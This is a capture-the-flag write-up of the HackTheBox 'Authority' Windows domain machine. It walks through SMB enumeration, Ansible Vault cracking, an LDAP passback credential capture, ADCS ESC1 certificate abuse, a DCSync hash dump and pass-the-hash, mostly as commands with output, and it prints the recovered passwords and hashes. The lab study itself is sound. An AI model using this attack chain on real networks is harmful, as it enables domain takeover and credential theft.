---
title: Authority - Medium HTB
date: 2023-09-15 10:11:53 +/-0800
categories: [writeup, HackTheBox]
writeup: :title
permalink: /authority
tags: [AD, Common services]     # TAG names should always be lowercase
---

- OS: **Windows**
- Difficulty: **Medium**
- Author: **4nh4ck1ne**


# Authority
Windows "Medium" machine from HackTheBox

### Scanning
The CTF start with a huge nmap scan: `nmap -p1-10000 -sV -Pn --max-retries 1 -T4 target_ip`

```bash
#result 
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-25 19:49:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp open  ssl/https-alt
9389/tcp open  mc-nmf        .NET Message Framing
```

We can target the port HTTPS (8443) and LDAP (389) : `nmap -p389-8443 -sV -sC -T4 -Pn target-ip`
```bash
#result
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-09-26T22:17:07+00:00; +4h00m01s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
8443/tcp open  ssl/https-alt
```

### Enumeration

Starting by listing SMB with smbmap: `smbmap -H 10.10.11.222 -u "Anonymous" `
```

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.10.11.222:445        Name: authority.htb             Status: Guest session   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Department Shares                                       NO ACCESS
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share
``` 

We must now access the "Development" folder share with smbclient and download his account: `smbclient //10.10.11.222/Development`

```
#smbclient shell 

smb: \> prompt on
smb: \> recurse on 
smb: \> mget * 
```

Now that we have the directory accessible locally, we are able to analyze it. When can see in this directory a sub directory/PWM/defaults or sounds like a "storage" for encrypted passwords Ansible Vault: `cat Automation/Ansible/PWM/defaults/main.yml 
`
```
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764
```

John the ripper the king! Has a mode to extract the ansible key hash in the encrypted password, you must create a file with an ansible hash then use john to crack the decryption password :
```
cat first.yml                               
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438

#extract the password 
ansible2john first.yml > forjohn.txt

#crack it 
john --wordlist=/usr/share/wordlists/rockyou.txt forjohn.txt
```

We have password decryption more than just decrypting ansible vaults: 
```
ansible-vault decrypt first.yml --output decrypt1.txt
Vault password: 
Decryption successful
```

### Exploit 

So we now that we have a user and password, let's continue our enumeration to the website on port 8443: 


![website](/assets/authority/websitelogin.png)

Now we have a username and password we can try to connect to this app. 

![FirstConnection](/assets/authority/firstconnection.png)

it does not seem to work... after some try, i understand that it is necessary to connect with the button "configuration manager"

![FirstAccess](/assets/authority/firstacces.png)

Ok, we are in the application trying to see what we can do, Knowing that this application has a relationship with the LDAP protocol. In the configuration editor menu, we can see that we have a pretty cool handle on the LDAPs server address.
Directly I think of an attack of type LDAP passback attacks, for that we must mount an LDAP server on our attacking machine: 
```
#installer LDAP
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

#create .ldif file for downgrade the server with this content
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred

#downgrade the server 
ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

```
In order to capture ldap requests on our server, we will use TCPdump: 
```
tcpdump -SX -i network_card tcp port 389
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

We can now modify the ldap server of the application by putting our ldap server and see what happens, CAUTION!: put in ldap and not ldap(s), yes I literally get blocked on it for an evening because of this...

![UpdateLdap](/assets/authority/updateLdap.png)

You can click on the "test LDAP profile" button to receive your LDAP connection: 
```
#TCPdump result 
21:10:38.102271 IP authority.htb.50619 > 10.10.16.3.ldap: Flags [SEW], seq 2719860159, win 64240, options [mss 1338,nop,wscale 8,nop,nop,sackOK], length 0
        0x0000:  4502 0034 3ea7 4000 7f06 8d26 0a0a 0bde  E..4>.@....&....
        0x0010:  0a0a 1003 c5bb 0185 a21d c5bf 0000 0000  ................
        0x0020:  80c2 faf0 14c7 0000 0204 053a 0103 0308  ...........:....
        0x0030:  0101 0402                                ....
21:10:38.102314 IP 10.10.16.3.ldap > authority.htb.50619: Flags [S.], seq 2484611885, ack 2719860160, win 64240, options [mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
        0x0000:  4500 0034 0000 4000 4006 0ad0 0a0a 1003  E..4..@.@.......
        0x0010:  0a0a 0bde 0185 c5bb 9418 2b2d a21d c5c0  ..........+-....
        0x0020:  8012 faf0 55b7 0000 0204 05b4 0101 0402  ....U...........
        0x0030:  0103 0307                                ....
21:10:38.151013 IP authority.htb.50619 > 10.10.16.3.ldap: Flags [.], ack 2484611886, win 1024, length 0
        0x0000:  4500 0028 3ea9 4000 7f06 8d32 0a0a 0bde  E..(>.@....2....
        0x0010:  0a0a 1003 c5bb 0185 a21d c5c0 9418 2b2e  ..............+.
        0x0020:  5010 0400 8d7a 0000                      P....z..
21:10:38.219276 IP authority.htb.50619 > 10.10.16.3.ldap: Flags [P.], seq 2719860160:2719860251, ack 2484611886, win 1024, length 91
        0x0000:  4500 0083 3eaa 4000 7f06 8cd6 0a0a 0bde  E...>.@.........
        0x0010:  0a0a 1003 c5bb 0185 a21d c5c0 9418 2b2e  ..............+.
        0x0020:  5018 0400 c5e2 0000 3059 0201 0160 5402  P.......0Y...`T.
        0x0030:  0103 043b 434e 3d73 7663 5f6c 6461 702c  ...;CN=svc_ldap,
        0x0040:  4f55 3d53 6572 7669 6365 2041 6363 6f75  OU=Service.Accou
        0x0050:  6e74 732c 4f55 3d43 4f52 502c 4443 3d61  nts,OU=CORP,DC=a
        0x0060:  7574 686f 7269 7479 2c44 433d 6874 6280  uthority,DC=htb.
        0x0070:  126c 4461 505f 316e 5f74 6833 5f63 6c65  .lDaP_1n_th3_cle
        0x0080:  3472 21                                  4r!
```
If you are careful can see a user and a password in the LDAP request.

svc_ldap: **lDaP_1n_th3_cle4r!**

You can now use evil-winrm for example to get a first connection: `evil-winrm -u "svc_ldap" -p 'lDaP_1n_th3_cle4r!' -i "target_ip"`

### Privilege escalation

The elevation of privileges will relate to the exploitation of vulnerable certificate, in order to do this we will use the tool of the suite impacket certipy, thanks to this tool we will be able to find vulnerabilities in ADCS: `certipy find -u "svc_ldap@authority.htb" -p 'lDaP_1n_th3_cle4r!' -dc-ip '10.10.11.222' -vulnerable -stdout`
```
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : 16777216
                                          65536
                                          ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

We can see that the tool gives us a vulnerable certificate pattern with an ESC1 (Template allows SAN) attack via a wrong permission for the Domain computer group. It happens that our user can add computers in the domain, thanks to one of its privileges (**SeMachineAccountPrivilege**). 
```
whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We go therefore adding a fake PC in the domain via the addcomputer.py tool of the impacket suite: `addcomputer.py -method LDAPS -dc-ip 10.10.11.222 -computer-pass Hackerman123 -computer-name TRYHARD$ authority.htb/svc_ldap:lDaP_1n_th3_cle4r!`
```
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[*] Successfully added machine account TRYHARD$ with password Hackerman123
```

Now let's try to recover a signed certificate with a Domain-admin user: `certipy req -u 'TRYHARD$@authority.htb' -p 'Hackerman123' -target "10.10.11.222" -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb'`
```
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 8
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Ok, Knowing that we have our certificate, we can now try to make the pass the certificate. 

NB: A great github that much help for that and its tool too : [Passthecert.py](https://github.com/AlmondOffSec/PassTheCert/tree/main/Python)

Let's extract the private key and the certificate from the file . Huge thanks to the passthecert.py tool: 
```
#extract the certificate
certipy cert -pfx administrator.pfx -nokey -out nocert.crt
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'nocert.crt'

#extract the private keys
certipy cert -pfx administrator.pfx -nocert -out admin.key
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Writing private key to 'admin.key'
```

Let's continue by using the "**Elevate a user for DCSYNC**" technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller: `passthecert.py -action modify_user -crt nocert.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222 -target svc_ldap -elevate`
```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Granted user 'svc_ldap' DCSYNC rights!
```
We can now dump the DC hash with secretDump for example: `secretsdump -outputfile 'something' 'authority.htb'/'svc_ldap':'lDaP_1n_th3_cle4r!'@'10.10.11.222'`

```
Impacket for Exegol - v0.10.1.dev1+20230806.34223.faf17b2 - Copyright 2022 Fortra - forked by ThePorgs

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:a40a859c7378fe87232c17822a6fdc4d:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:80a2fd700c1111656e3f24e7d87cba3cc19a18e4fa1f7cc9593a14355a4350c1
AUTHORITY$:aes128-cts-hmac-sha1-96:a334be25cce6a0cec0040a75162872a9
AUTHORITY$:des-cbc-md5:dfef3b2c80bab95e
[*] Cleaning up...
```

We therefore have the NTLM hash of the administrator we can do passthehash with evil-winrm for example to connect with the user Administrator: `evil-winrm -u "Administrator" -H '6961f422924da90a6928197429eea4ed' -i "10.10.11.222"`

and WE GOT ROOT ! Let's get the FLAG and finish his box.. 

Honestly, this a great box coming from the well know HackTheBox platforme, as usual. 

Thanks to them for they amazing work !



